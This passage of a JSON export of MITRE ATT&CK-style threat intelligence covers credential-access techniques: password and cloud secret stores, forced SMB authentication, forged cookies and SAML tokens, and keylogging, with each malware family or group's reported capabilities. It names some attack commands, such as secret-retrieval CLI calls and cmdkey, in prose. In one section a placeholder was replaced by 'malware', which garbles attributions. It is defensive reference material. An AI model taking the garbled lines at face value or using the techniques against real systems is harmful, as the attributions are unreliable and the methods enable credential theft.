                "description": "Adversaries may acquire credentials from cloud-native secret management solutions such as AWS Secrets Manager, GCP Secret Manager, Azure Key Vault, and Terraform Vault.  Secrets managers support the secure centralized management of passwords, API keys, and other credential material. Where secrets managers are in use, cloud services can dynamically acquire credentials via API requests rather than accessing secrets insecurely stored in plain text files or environment variables.  If an adversary is able to gain sufficient privileges in a cloud environment \u2013 for example, by obtaining the credentials of high-privileged Cloud Accounts or compromising a service that has permission to retrieve secrets \u2013 they may be able to request secrets from the secrets manager. This can be accomplished via commands such as get-secret-value in AWS, gcloud secrets describe in GCP, and az key vault secret show in Azure.[1][2][3][4][5]Note: this technique is distinct from Cloud Instance Metadata API in that the credentials are being directly requested from the cloud secrets manager, rather than through the medium of the instance metadata API.",
                "Procedure": {
                    "S1091": {
                        "ID": "S1091",
                        "Name": "Pacu",
                        "Description": "<name> can retrieve secrets from the AWS Secrets Manager via the enum_secrets module.[6]"
                    }
                }
            }
        },
        "tactic": "Credential Access",
        "description": "Adversaries may search for common password storage locations to obtain user credentials.[1] Passwords are stored in several places on a system, depending on the operating system or application holding the credentials. There are also specific applications and services that store passwords to make them easier for users to manage and maintain, such as password managers and cloud secrets vaults. Once credentials are obtained, they can be used to perform lateral movement and access restricted information.",
        "Procedure": {
            "S0331": {
                "ID": "S0331",
                "Name": "Agent Tesla",
                "Description": "malware has the ability to steal credentials from FTP clients and wireless profiles.[2]"
            },
            "G0064": {
                "ID": "G0064",
                "Name": "APT33",
                "Description": "malware has used a variety of publicly available tools like LaZagne to gather credentials.[3][4]"
            },
            "G0087": {
                "ID": "G0087",
                "Name": "APT39",
                "Description": "malware has used the Smartftp Password Decryptor tool to decrypt FTP passwords.[5]"
            },
            "S0373": {
                "ID": "S0373",
                "Name": "Astaroth",
                "Description": "malware uses an external software known as NetPass to recover passwords. [6]"
            },
            "S0484": {
                "ID": "S0484",
                "Name": "Carberp",
                "Description": "malware's passw.plug plugin can gather account information from multiple instant messaging, email, and social media services, as well as FTP, VNC, and VPN clients.[7]"
            },
            "S0050": {
                "ID": "S0050",
                "Name": "CosmicDuke",
                "Description": "malware collects user credentials, including passwords, for various programs including popular instant messaging applications and email clients as well as WLAN keys.[1]"
            },
            "S1111": {
                "ID": "S1111",
                "Name": "DarkGate",
                "Description": "malware use Nirsoft Network Password Recovery or NetPass tools to steal stored RDP credentials in some malware versions.[8]"
            },
            "G0120": {
                "ID": "G0120",
                "Name": "Evilnum",
                "Description": "malware can collect email credentials from victims.[9]"
            },
            "G0037": {
                "ID": "G0037",
                "Name": "FIN6",
                "Description": "malware has used the Stealer One credential stealer to target e-mail and file transfer utilities including FTP.[10]"
            },
            "G1001": {
                "ID": "G1001",
                "Name": "HEXANE",
                "Description": "malware has run cmdkey on victim machines to identify stored credentials.[11]"
            },
            "S0526": {
                "ID": "S0526",
                "Name": "KGH_SPY",
                "Description": "malware can collect credentials from WINSCP.[12]"
            },
            "S0349": {
                "ID": "S0349",
                "Name": "LaZagne",
                "Description": "malware can obtain credentials from databases, mail, and WiFi across multiple platforms.[13]"
            },
            "G0077": {
                "ID": "G0077",
                "Name": "Leafminer",
                "Description": "malware used several tools for retrieving login and password information, including LaZagne.[14]"
            },
            "S0447": {
                "ID": "S0447",
                "Name": "Lokibot",
                "Description": "malware has stolen credentials from multiple applications and data sources including Windows OS credentials, email clients, FTP, and SFTP clients.[15]"
            },
            "G1026": {
                "ID": "G1026",
                "Name": "Malteiro",
                "Description": "malware has obtained credentials from mail clients via NirSoft MailPassView.[16]"
            },
            "S0167": {
                "ID": "S0167",
                "Name": "Matryoshka",
                "Description": "malware is capable of stealing Outlook passwords.[17][18]"
            },
            "S0002": {
                "ID": "S0002",
                "Name": "Mimikatz",
                "Description": "malware performs credential dumping to obtain account and password information useful in gaining access to additional systems and enterprise network resources. It contains functionality to acquire information about credentials in many ways, including from the credential vault and DPAPI.[19][20][21][22][23]"
            },
            "S1122": {
                "ID": "S1122",
                "Name": "Mispadu",
                "Description": "malware has obtained credentials from mail clients via NirSoft MailPassView.[16][24][25]"
            },
            "G0069": {
                "ID": "G0069",
                "Name": "MuddyWater",
                "Description": "malware has performed credential dumping with LaZagne and other tools, including by dumping passwords saved in victim email.[26][27][28]"
            },
            "S0198": {
                "ID": "S0198",
                "Name": "NETWIRE",
                "Description": "malware can retrieve passwords from messaging and mail client applications.[29]"
            },
            "G0049": {
                "ID": "G0049",
                "Name": "OilRig",
                "Description": "malware has used credential dumping tools such as LaZagne to steal credentials to accounts logged into the compromised system and to Outlook Web Access.[30][31][32][33]"
            },
            "S0138": {
                "ID": "S0138",
                "Name": "OLDBAIT",
                "Description": "malware collects credentials from several email clients.[34]"
            },
            "S0048": {
                "ID": "S0048",
                "Name": "PinchDuke",
                "Description": "malware steals credentials from compromised hosts. malware's credential stealing functionality is believed to be based on the source code of the Pinch credential stealing malware (also known as LdPinch). Credentials targeted by malware include ones associated with many sources such as The Bat!, Yahoo!, Mail.ru, Passport.Net, Google Talk, and Microsoft Outlook.[1]"
            },
            "S0435": {
                "ID": "S0435",
                "Name": "PLEAD",
                "Description": "malware has the ability to steal saved passwords from Microsoft Outlook.[35]"
            },
            "S0378": {
                "ID": "S0378",
                "Name": "PoshC2",
                "Description": "malware can decrypt passwords stored in the RDCMan configuration file.[36]"
            },
            "S0113": {
                "ID": "S0113",
                "Name": "Prikormka",
                "Description": "A module in malware collects passwords stored in applications installed on the victim.[37]"
            },
            "S0192": {
                "ID": "S0192",
                "Name": "Pupy",
                "Description": "malware can use Lazagne for harvesting credentials.[38]"
            },
            "S0262": {
                "ID": "S0262",
                "Name": "QuasarRAT",
                "Description": "malware can obtain passwords from common FTP clients.[39][40]"
            },
            "C0024": {
                "ID": "C0024",
                "Name": "SolarWinds Compromise",
                "Description": "During the malware, APT29 used account credentials they obtained to attempt access to Group Managed Service Account (gMSA) passwords.[41]"
            },
            "G0038": {
                "ID": "G0038",
                "Name": "Stealth Falcon",
                "Description": "malware malware gathers passwords from multiple sources, including Windows Credential Vault and Outlook.[42]"
            },
            "G1017": {
                "ID": "G1017",
                "Name": "Volt Typhoon",
                "Description": "malware has attempted to obtain credentials from OpenSSH, realvnc, and PuTTY.[43]"
            }
        }
    },
    "T1212": {
        "ttp_name": "Exploitation for Credential Access",
        "ttp_id": "T1212",
        "href": "/techniques/T1212",
        "tactic": "Credential Access",
        "description": "Adversaries may exploit software vulnerabilities in an attempt to collect credentials. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0Credentialing and authentication mechanisms may be targeted for exploitation by adversaries as a means to gain access to useful credentials or circumvent the process to gain authenticated access to systems. One example of this is MS14-068, which targets Kerberos and can be used to forge Kerberos tickets using domain user permissions.[1][2] Another example of this is replay attacks, in which the adversary intercepts data packets sent between parties and then later replays these packets. If services don't properly validate authentication requests, these replayed packets may allow an adversary to impersonate one of the parties and gain unauthorized access or privileges.[3][4][5]Such exploitation has been demonstrated in cloud environments as well. For example, adversaries have exploited vulnerabilities in public cloud infrastructure that allowed for unintended authentication token creation and renewal.[6]Exploitation for credential access may also result in Privilege Escalation depending on the process targeted or credentials obtained.",
        "Procedure": {}
    },
    "T1187": {
        "ttp_name": "Forced Authentication",
        "ttp_id": "T1187",
        "href": "/techniques/T1187",
        "tactic": "Credential Access",
        "description": "Adversaries may gather credential material by invoking or forcing a user to automatically provide authentication information through a mechanism in which they can intercept.The Server Message Block (SMB) protocol is commonly used in Windows networks for authentication and communication between systems for access to resources and file sharing. When a Windows system attempts to connect to an SMB resource it will automatically attempt to authenticate and send credential information for the current user to the remote system. [1] This behavior is typical in enterprise environments so that users do not need to enter credentials to access network resources.Web Distributed Authoring and Versioning (WebDAV) is also typically used by Windows systems as a backup protocol when SMB is blocked or fails. WebDAV is an extension of HTTP and will typically operate over TCP ports 80 and 443. [2] [3]Adversaries may take advantage of this behavior to gain access to user account hashes through forced SMB/WebDAV authentication. An adversary can send an attachment to a user through spearphishing that contains a resource link to an external server controlled by the adversary (i.e. Template Injection), or place a specially crafted file on navigation path for privileged accounts (e.g. .SCF file placed on desktop) or on a publicly accessible share to be accessed by victim(s). When the user's system accesses the untrusted resource it will attempt authentication and send information, including the user's hashed credentials, over SMB to the adversary controlled server. [4] With access to the credential hash, an adversary can perform off-line Brute Force cracking to gain access to plaintext credentials. [5]There are several different ways this can occur. [6] Some specifics from in-the-wild use include:A spearphishing attachment containing a document with a resource that is automatically loaded when the document is opened (i.e. Template Injection). The document can include, for example, a request similar to file[:]//[remote address]/Normal.dotm to trigger the SMB request. [7]A modified .LNK or .SCF file with the icon filename pointing to an external reference such as \\[remote address]\\pic.png that will force the system to load the resource when the icon is rendered to repeatedly gather credentials. [7]",
        "Procedure": {
            "G0079": {
                "ID": "G0079",
                "Name": "DarkHydrus",
                "Description": "malware used Template Injection to launch an authentication window for users to enter their credentials.[8]"
            },
            "G0035": {
                "ID": "G0035",
                "Name": "Dragonfly",
                "Description": "malware has gathered hashed user credentials over SMB using spearphishing attachments with external resource links and by modifying .LNK file icon resources to collect credentials from virtualized systems.[9][10]"
            },
            "S0634": {
                "ID": "S0634",
                "Name": "EnvyScout",
                "Description": "malware can use protocol handlers to coax the operating system to send NTLMv2 authentication responses to attacker-controlled infrastructure.[11]"
            }
        }
    },
    "T1606": {
        "ttp_name": "Forge Web Credentials",
        "ttp_id": "T1606",
        "href": "/techniques/T1606",
        "subtechnique": {
            "001": {
                "name": "Web Cookies",
                "href": "/techniques/T1606/001",
                "description": "Adversaries may forge web cookies that can be used to gain access to web applications or Internet services. Web applications and services (hosted in cloud SaaS environments or on-premise servers) often use session cookies to authenticate and authorize user access.Adversaries may generate these cookies in order to gain access to web resources. This differs from Steal Web Session Cookie and other similar behaviors in that the cookies are new and forged by the adversary, rather than stolen or intercepted from legitimate users. Most common web applications have standardized and documented cookie values that can be generated using provided tools or interfaces.[1] The generation of web cookies often requires secret values, such as passwords, Private Keys, or other cryptographic seed values.Once forged, adversaries may use these web cookies to access resources (Web Session Cookie), which may bypass multi-factor and other authentication protection mechanisms.[2][1][3]",
                "Procedure": {
                    "C0024": {
                        "ID": "C0024",
                        "Name": "SolarWinds Compromise",
                        "Description": "During the <name>, APT29 bypassed MFA set on OWA accounts by generating a cookie value from a previously stolen secret key.[2]"
                    }
                }
            },
            "002": {
                "name": "SAML Tokens",
                "href": "/techniques/T1606/002",
                "description": "An adversary may forge SAML tokens with any permissions claims and lifetimes if they possess a valid SAML token-signing certificate.[1] The default lifetime of a SAML token is one hour, but the validity period can be specified in the NotOnOrAfter value of the conditions ... element in a token. This value can be changed using the AccessTokenLifetime in a LifetimeTokenPolicy.[2] Forged SAML tokens enable adversaries to authenticate across services that use SAML 2.0 as an SSO (single sign-on) mechanism.[3]An adversary may utilize Private Keys to compromise an organization's token-signing certificate to create forged SAML tokens. If the adversary has sufficient permissions to establish a new federation trust with their own Active Directory Federation Services (AD FS) server, they may instead generate their own trusted token-signing certificate.[4] This differs from Steal Application Access Token and other similar behaviors in that the tokens are new and forged by the adversary, rather than stolen or intercepted from legitimate users.An adversary may gain administrative Azure AD privileges if a SAML token is forged which claims to represent a highly privileged account. This may lead to Use Alternate Authentication Material, which may bypass multi-factor and other authentication protection mechanisms.[4]",
                "Procedure": {
                    "S0677": {
                        "ID": "S0677",
                        "Name": "AADInternals",
                        "Description": "<name> can be used to create SAML tokens using the AD Federated Services token signing certificate.[5]"
                    },
                    "C0024": {
                        "ID": "C0024",
                        "Name": "SolarWinds Compromise",
                        "Description": "During the <name>, APT29 created tokens using compromised SAML signing certificates.[6][7]"
                    }
                }
            }
        },
        "tactic": "Credential Access",
        "description": "Adversaries may forge credential materials that can be used to gain access to web applications or Internet services. Web applications and services (hosted in cloud SaaS environments or on-premise servers) often use session cookies, tokens, or other materials to authenticate and authorize user access.Adversaries may generate these credential materials in order to gain access to web resources. This differs from Steal Web Session Cookie, Steal Application Access Token, and other similar behaviors in that the credentials are new and forged by the adversary, rather than stolen or intercepted from legitimate users.The generation of web credentials often requires secret values, such as passwords, Private Keys, or other cryptographic seed values.[1] Adversaries may also forge tokens by taking advantage of features such as the AssumeRole and GetFederationToken APIs in AWS, which allow users to request temporary security credentials (i.e., Temporary Elevated Cloud Access), or the zmprov gdpak command in Zimbra, which generates a pre-authentication key that can be used to generate tokens for any user in the domain.[2][3]Once forged, adversaries may use these web credentials to access resources (ex: Use Alternate Authentication Material), which may bypass multi-factor and other authentication protection mechanisms.[4][5][6]",
        "Procedure": {}
    },
    "T1056": {
        "ttp_name": "Input Capture",
        "ttp_id": "T1056",
        "href": "/techniques/T1056",
        "subtechnique": {
            "001": {
                "name": "Keylogging",
                "href": "/techniques/T1056/001",
                "description": "Adversaries may log user keystrokes to intercept credentials as the user types them. Keylogging is likely to be used to acquire credentials for new access opportunities when OS Credential Dumping efforts are not effective, and may require an adversary to intercept keystrokes on a system for a substantial period of time before credentials can be successfully captured. In order to increase the likelihood of capturing credentials quickly, an adversary may also perform actions such as clearing browser cookies to force users to reauthenticate to systems.[1]Keylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes.[2] Some methods include:Hooking API callbacks used for processing keystrokes. Unlike Credential API Hooking, this focuses solely on API functions intended for processing keystroke data.Reading raw keystroke data from the hardware buffer.Windows Registry modifications.Custom drivers.Modify System Image may provide adversaries with hooks into the operating system of network devices to read raw keystrokes for login sessions.[3]",
                "Procedure": {
                    "C0028": {
                        "ID": "C0028",
                        "Name": "2015 Ukraine Electric Power Attack",
                        "Description": "During the <name>, Sandworm Team gathered account credentials via a BlackEnergy keylogger plugin. [4][5]"
                    },
                    "S0045": {
                        "ID": "S0045",
                        "Name": "ADVSTORESHELL",
                        "Description": "<name> can perform keylogging.[6][7]"
                    },
                    "S0331": {
                        "ID": "S0331",
                        "Name": "Agent Tesla",
                        "Description": "<name> can log keystrokes on the victim\u2019s machine.[8][9][10][11][12]"
                    },
                    "G0130": {
                        "ID": "G0130",
                        "Name": "Ajax Security Team",
                        "Description": "<name> has used CWoolger and MPK, custom-developed malware, which recorded all keystrokes on an infected system.[13]"
                    },
                    "S0622": {
                        "ID": "S0622",
                        "Name": "AppleSeed",
                        "Description": "<name> can use GetKeyState and GetKeyboardState to capture keystrokes on the victim\u2019s machine.[14][15]"
                    },
                    "G0007": {
                        "ID": "G0007",
                        "Name": "APT28",
                        "Description": "<name> has used tools to perform keylogging.[16][17][18]"
                    },
                    "G0022": {
                        "ID": "G0022",
                        "Name": "APT3",
                        "Description": "<name> has used a keylogging tool that records keystrokes in encrypted files.[19]"
                    },
                    "G0050": {
                        "ID": "G0050",
                        "Name": "APT32",
                        "Description": "<name> has abused the PasswordChangeNotify to monitor for and capture account password changes.[20]"
                    },
                    "G0082": {
                        "ID": "G0082",
                        "Name": "APT38",
                        "Description": "<name> used a Trojan called KEYLIME to capture keystrokes from the victim\u2019s machine.[21]"
                    },
                    "G0087": {
                        "ID": "G0087",
                        "Name": "APT39",
                        "Description": "<name> has used tools for capturing keystrokes.[22][23]"
                    },
                    "G0096": {
                        "ID": "G0096",
                        "Name": "APT41",
                        "Description": "<name> used a keylogger called GEARSHIFT on a target system.[24]"
                    },
                    "G1023": {
                        "ID": "G1023",
                        "Name": "APT5",
                        "Description": "<name> has used malware with keylogging capabilities to monitor the communications of targeted entities.[25][26]"
                    },
                    "S0373": {
                        "ID": "S0373",
                        "Name": "Astaroth",
                        "Description": "<name> logs keystrokes from the victim's machine. [27]"
                    },
                    "S1087": {
                        "ID": "S1087",
                        "Name": "AsyncRAT",
                        "Description": "<name> can capture keystrokes on the victim\u2019s machine.[28]"
                    },
                    "S0438": {
                        "ID": "S0438",
                        "Name": "Attor",
                        "Description": "One of <name>'s plugins can collect user credentials via capturing keystrokes and can capture keystrokes pressed within the window of the injected process.[29]"
                    },
                    "S0414": {
                        "ID": "S0414",
                        "Name": "BabyShark",
                        "Description": "<name> has a PowerShell-based remote administration ability that can implement a PowerShell or C# based keylogger.[30]"
                    },
                    "S0128": {
                        "ID": "S0128",
                        "Name": "BADNEWS",
                        "Description": "When it first starts, <name> spawns a new thread to log keystrokes.[31][32][33]"
                    },
                    "S0337": {
                        "ID": "S0337",
                        "Name": "BadPatch",
                        "Description": "<name> has a keylogging capability.[34]"
                    },
                    "S0234": {
                        "ID": "S0234",
                        "Name": "Bandook",
                        "Description": "<name> contains keylogging capabilities.[35]"
                    },
                    "S0017": {
                        "ID": "S0017",
                        "Name": "BISCUIT",
                        "Description": "<name> can capture keystrokes.[36]"
                    },
                    "S0089": {
                        "ID": "S0089",
                        "Name": "BlackEnergy",
                        "Description": "<name> has run a keylogger plug-in on a victim.[37]"
                    },
                    "S0454": {
                        "ID": "S0454",
                        "Name": "Cadelspy",
                        "Description": "<name> has the ability to log keystrokes on the compromised host.[38]"
                    },
                    "S0030": {
                        "ID": "S0030",
                        "Name": "Carbanak",
                        "Description": "<name> logs key strokes for configured processes and sends them back to the C2 server.[39][40]"
                    },
                    "S0348": {
                        "ID": "S0348",
                        "Name": "Cardinal RAT",
                        "Description": "<name> can log keystrokes.[41]"
                    },
                    "S0261": {
                        "ID": "S0261",
                        "Name": "Catchamas",
                        "Description": "<name> collects keystrokes from the victim\u2019s machine.[42]"
                    },
                    "S0023": {
                        "ID": "S0023",
                        "Name": "CHOPSTICK",
                        "Description": "<name> is capable of performing keylogging.[43][6][17]"
                    },
                    "S0660": {
                        "ID": "S0660",
                        "Name": "Clambling",
                        "Description": "<name> can capture keystrokes on a compromised host.[44][45]"
                    },
                    "S0154": {
                        "ID": "S0154",
                        "Name": "Cobalt Strike",
                        "Description": "<name> can track key presses with a keylogger module.[46][47][48]"
                    },
                    "S0338": {
                        "ID": "S0338",
                        "Name": "Cobian RAT",
                        "Description": "<name> has a feature to perform keylogging on the victim\u2019s machine.[49]"
                    },
                    "S0050": {
                        "ID": "S0050",
                        "Name": "CosmicDuke",
                        "Description": "<name> uses a keylogger.[50]"
                    },
                    "S0115": {
                        "ID": "S0115",
                        "Name": "Crimson",
                        "Description": "<name> can use a module to perform keylogging on compromised hosts.[51][52][53]"
                    },
                    "S0625": {
                        "ID": "S0625",
                        "Name": "Cuba",
                        "Description": "<name> logs keystrokes via polling by using GetKeyState and VkKeyScan functions.[54]"
                    },
                    "C0029": {
                        "ID": "C0029",
                        "Name": "Cutting Edge",
                        "Description": "During <name>, threat actors modified a JavaScript file on the Web SSL VPN component of Ivanti Connect Secure devices to keylog credentials.[55]"
                    },
                    "S0334": {
                        "ID": "S0334",
                        "Name": "DarkComet",
                        "Description": "<name> has a keylogging capability.[56]"
                    },
                    "S1111": {
                        "ID": "S1111",
                        "Name": "DarkGate",
                        "Description": "<name> will spawn a thread on execution to capture all keyboard events and write them to a predefined log file.[57]"
                    },
                    "G0012": {
                        "ID": "G0012",
                        "Name": "Darkhotel",
                        "Description": "<name> has used a keylogger.[58]"
                    },
                    "S1066": {
                        "ID": "S1066",
                        "Name": "DarkTortilla",
                        "Description": "<name> can download a keylogging module.[59]"
                    },
                    "S0673": {
                        "ID": "S0673",
                        "Name": "DarkWatchman",
                        "Description": "<name> can track key presses with a keylogger module.[60]"
                    },
                    "S0187": {
                        "ID": "S0187",
                        "Name": "Daserf",
                        "Description": "<name> can log keystrokes.[61][62]"
                    },
                    "S0021": {
                        "ID": "S0021",
                        "Name": "Derusbi",
                        "Description": "<name> is capable of logging keystrokes.[63]"
                    },
                    "S0213": {
                        "ID": "S0213",
                        "Name": "DOGCALL",
                        "Description": "<name> is capable of logging keystrokes.[64][65]"
                    },
                    "S0567": {
                        "ID": "S0567",
                        "Name": "Dtrack",
                        "Description": "<name>\u2019s dropper contains a keylogging executable.[66]"
                    },
                    "S0038": {
                        "ID": "S0038",
                        "Name": "Duqu",
                        "Description": "<name> can track key presses with a keylogger module.[67]"
                    },
                    "S0062": {
                        "ID": "S0062",
                        "Name": "DustySky",
                        "Description": "<name> contains a keylogger.[68]"
                    },
                    "S0593": {
                        "ID": "S0593",
                        "Name": "ECCENTRICBANDWAGON",
                        "Description": "<name> can capture and store keystrokes.[69]"
                    },
                    "S0363": {
                        "ID": "S0363",
                        "Name": "Empire",
                        "Description": "<name> includes keylogging capabilities for Windows, Linux, and macOS systems.[70]"
                    },
                    "S0152": {
                        "ID": "S0152",
                        "Name": "EvilGrab",
                        "Description": "<name> has the capability to capture keystrokes.[71]"
                    },
                    "S0569": {
                        "ID": "S0569",
                        "Name": "Explosive",
                        "Description": "<name> has leveraged its keylogging capabilities to gain access to administrator accounts on target servers.[72][73]"
                    },
                    "S0076": {
                        "ID": "S0076",
                        "Name": "FakeM",
                        "Description": "<name> contains a keylogger module.[74]"
                    },
                    "G1016": {
                        "ID": "G1016",
                        "Name": "FIN13",
                        "Description": "<name> has logged the keystrokes of victims to escalate privileges.[75]"
                    },
                    "G0085": {
                        "ID": "G0085",
                        "Name": "FIN4",
                        "Description": "<name> has captured credentials via fake Outlook Web App (OWA) login pages and has also used a .NET based keylogger.[76][77]"
                    },
                    "S0381": {
                        "ID": "S0381",
                        "Name": "FlawedAmmyy",
                        "Description": "<name> can collect keyboard events.[78]"
                    },
                    "S1044": {
                        "ID": "S1044",
                        "Name": "FunnyDream",
                        "Description": "The <name> Keyrecord component can capture keystrokes.[79]"
                    },
                    "S0410": {
                        "ID": "S0410",
                        "Name": "Fysbis",
                        "Description": "<name> can perform keylogging.[80]"
                    },
                    "S0032": {
                        "ID": "S0032",
                        "Name": "gh0st RAT",
                        "Description": "<name> has a keylogger.[81][82]"
                    },
                    "S0531": {
                        "ID": "S0531",
                        "Name": "Grandoreiro",
                        "Description": "<name> can log keystrokes on the victim's machine.[83]"
                    },
                    "S0342": {
                        "ID": "S0342",
                        "Name": "GreyEnergy",
                        "Description": "<name> has a module to harvest pressed keystrokes.[84]"
                    },
                    "G0043": {
                        "ID": "G0043",
                        "Name": "Group5",
                        "Description": "Malware used by <name> is capable of capturing keystrokes.[85]"
                    },
                    "S0170": {
                        "ID": "S0170",
                        "Name": "Helminth",
                        "Description": "The executable version of <name> has a module to log keystrokes.[86]"
                    },
                    "G1001": {
                        "ID": "G1001",
                        "Name": "HEXANE",
                        "Description": "<name> has used a PowerShell-based keylogger named kl.ps1.[87][88]"
                    },
                    "S0070": {
                        "ID": "S0070",
                        "Name": "HTTPBrowser",
                        "Description": "<name> is capable of capturing keystrokes on victims.[89]"
                    },
                    "S0434": {
                        "ID": "S0434",
                        "Name": "Imminent Monitor",
                        "Description": "<name> has a keylogging module.[90]"
                    },
                    "S0260": {
                        "ID": "S0260",
                        "Name": "InvisiMole",
                        "Description": "<name> can capture keystrokes on a compromised host.[91]"
                    },
                    "S0201": {
                        "ID": "S0201",
                        "Name": "JPIN",
                        "Description": "<name> contains a custom keylogger.[92]"
                    },
                    "S0283": {
                        "ID": "S0283",
                        "Name": "jRAT",
                        "Description": "<name> has the capability to log keystrokes from the victim\u2019s machine, both offline and online.[93][94]"
                    },
                    "S0088": {
                        "ID": "S0088",
                        "Name": "Kasidet",
                        "Description": "<name> has the ability to initiate keylogging.[95]"
                    },
                    "G0004": {
                        "ID": "G0004",
                        "Name": "Ke3chang",
                        "Description": "<name> has used keyloggers.[96][97]"
                    },
                    "S0387": {
                        "ID": "S0387",
                        "Name": "KeyBoy",
                        "Description": "<name> installs a keylogger for intercepting credentials and keystrokes.[98]"
                    },
                    "S0526": {
                        "ID": "S0526",
                        "Name": "KGH_SPY",
                        "Description": "<name> can perform keylogging by polling the GetAsyncKeyState() function.[99]"
                    },
                    "G0094": {
                        "ID": "G0094",
                        "Name": "Kimsuky",
                        "Description": "<name> has used a PowerShell-based keylogger as well as a tool called MECHANICAL to log keystrokes.[100][101][102][103][1][15]"
                    },
                    "S0437": {
                        "ID": "S0437",
                        "Name": "Kivars",
                        "Description": "<name> has the ability to initiate keylogging on the infected host.[104]"
                    },
                    "S0356": {
                        "ID": "S0356",
                        "Name": "KONNI",
                        "Description": "<name> has the capability to perform keylogging.[105]"
                    },
                    "G0032": {
                        "ID": "G0032",
                        "Name": "Lazarus Group",
                        "Description": "<name> malware KiloAlfa contains keylogging functionality.[106][107]"
                    },
                    "S0447": {
                        "ID": "S0447",
                        "Name": "Lokibot",
                        "Description": "<name> has the ability to capture input on the compromised host via keylogging.[108]"
                    },
                    "S0409": {
                        "ID": "S0409",
                        "Name": "Machete",
                        "Description": "<name> logs keystrokes from the victim\u2019s machine.[109][110][111][112]"
                    },
                    "S1016": {
                        "ID": "S1016",
                        "Name": "MacMa",
                        "Description": "<name> can use Core Graphics Event Taps to intercept user keystrokes from any text input field and saves them to text files. Text input fields include Spotlight, Finder, Safari, Mail, Messages, and other apps that have text fields for passwords.[113][114]"
                    },
                    "S0282": {
                        "ID": "S0282",
                        "Name": "MacSpy",
                        "Description": "<name> captures keystrokes.[115]"
                    },
                    "G0059": {
                        "ID": "G0059",
                        "Name": "Magic Hound",
                        "Description": "<name> malware is capable of keylogging.[116]"
                    },
                    "S0652": {
                        "ID": "S0652",
                        "Name": "MarkiRAT",
                        "Description": "<name> can capture all keystrokes on a compromised host.[117]"
                    },
                    "S0167": {
                        "ID": "S0167",
                        "Name": "Matryoshka",
                        "Description": "<name> is capable of keylogging.[118][119]"
                    },
                    "G0045": {
                        "ID": "G0045",
                        "Name": "menuPass",
                        "Description": "<name> has used key loggers to steal usernames and passwords.[120]"
                    },
                    "S1059": {
                        "ID": "S1059",
                        "Name": "metaMain",
                        "Description": "<name> has the ability to log keyboard events.[121][122]"
                    },
                    "S0455": {
                        "ID": "S0455",
                        "Name": "Metamorfo",
                        "Description": "<name> has a command to launch a keylogger and capture keystrokes on the victim\u2019s machine.[123][124]"
                    },
                    "S0339": {
                        "ID": "S0339",
                        "Name": "Micropsia",
                        "Description": "<name> has keylogging capabilities.[125]"
                    },
                    "S1122": {
                        "ID": "S1122",
                        "Name": "Mispadu",
                        "Description": "<name> can log keystrokes on the victim's machine.[126][127][128]"
                    },
                    "S0149": {
                        "ID": "S0149",
                        "Name": "MoonWind",
                        "Description": "<name> has a keylogger.[129]"
                    },
                    "S0336": {
                        "ID": "S0336",
                        "Name": "NanoCore",
                        "Description": "<name> can perform keylogging on the victim\u2019s machine.[130]"
                    },
                    "S0247": {
                        "ID": "S0247",
                        "Name": "NavRAT",
                        "Description": "<name> logs the keystrokes on the targeted system.[131]"
                    },
                    "S0033": {
                        "ID": "S0033",
                        "Name": "NetTraveler",
                        "Description": "<name> contains a keylogger.[132]"
                    },
                    "S0198": {
                        "ID": "S0198",
                        "Name": "NETWIRE",
                        "Description": "<name> can perform keylogging.[133][134][135][136][137]"
                    },
                    "S1090": {
                        "ID": "S1090",
                        "Name": "NightClub",
                        "Description": "<name> can use a plugin for keylogging.[138]"
                    },
                    "S0385": {
                        "ID": "S0385",
                        "Name": "njRAT",
                        "Description": "<name> is capable of logging keystrokes.[139][140][85]"
                    },
                    "G0049": {
                        "ID": "G0049",
                        "Name": "OilRig",
                        "Description": "<name> has used keylogging tools called KEYPUNCH and LONGWATCH.[141][142]"
                    },
                    "S0439": {
                        "ID": "S0439",
                        "Name": "Okrum",
                        "Description": "<name> was seen using a keylogger tool to capture keystrokes. [143]"
                    },
                    "C0014": {
                        "ID": "C0014",
                        "Name": "Operation Wocao",
                        "Description": "During <name>, threat actors obtained the password for the victim's password manager via a custom keylogger.[144]"
                    },
                    "S0072": {
                        "ID": "S0072",
                        "Name": "OwaAuth",
                        "Description": "<name> captures and DES-encrypts credentials before writing the username and password to a log file, C:\\log.txt.[89]"
                    },
                    "S1050": {
                        "ID": "S1050",
                        "Name": "PcShare",
                        "Description": "<name> has the ability to capture keystrokes.[79]"
                    },
                    "S0643": {
                        "ID": "S0643",
                        "Name": "Peppy",
                        "Description": "<name> can log keystrokes on compromised hosts.[51]"
                    },
                    "G0068": {
                        "ID": "G0068",
                        "Name": "PLATINUM",
                        "Description": "<name> has used several different keyloggers.[92]"
                    },
                    "S0013": {
                        "ID": "S0013",
                        "Name": "PlugX",
                        "Description": "<name> has a module for capturing keystrokes per process including window titles.[145]"
                    },
                    "S0428": {
                        "ID": "S0428",
                        "Name": "PoetRAT",
                        "Description": "<name> has used a Python tool named klog.exe for keylogging.[146]"
                    },
                    "S0012": {
                        "ID": "S0012",
                        "Name": "PoisonIvy",
                        "Description": "<name> contains a keylogger.[147][148]"
                    },
                    "S0378": {
                        "ID": "S0378",
                        "Name": "PoshC2",
                        "Description": "<name> has modules for keystroke logging and capturing credentials from spoofed Outlook authentication messages.[149]"
                    },
                    "S1012": {
                        "ID": "S1012",
                        "Name": "PowerLess",
                        "Description": "<name> can use a module to log keystrokes.[150]"
                    },
                    "S0194": {
                        "ID": "S0194",
                        "Name": "PowerSploit",
                        "Description": "<name>'s Get-Keystrokes Exfiltration module can log keystrokes.[151][152]"
                    },
                    "S0113": {
                        "ID": "S0113",
                        "Name": "Prikormka",
                        "Description": "<name> contains a keylogger module that collects keystrokes and the titles of foreground windows.[153]"
                    },
                    "S0279": {
                        "ID": "S0279",
                        "Name": "Proton",
                        "Description": "<name> uses a keylogger to capture keystrokes.[115]"
                    },
                    "S0192": {
                        "ID": "S0192",
                        "Name": "Pupy",
                        "Description": "<name> uses a keylogger to capture keystrokes it then sends back to the server after it is stopped.[154]"
                    },
                    "S0650": {
                        "ID": "S0650",
                        "Name": "QakBot",
                        "Description": "<name> can capture keystrokes on a compromised host.[155][156][157]"
                    },
                    "S0262": {
                        "ID": "S0262",
                        "Name": "QuasarRAT",
                        "Description": "<name> has a built-in keylogger.[158][159]"
                    },
                    "S0662": {
                        "ID": "S0662",
                        "Name": "RCSession",
                        "Description": "<name> has the ability to capture keystrokes on a compromised host.[44][160]"
                    },
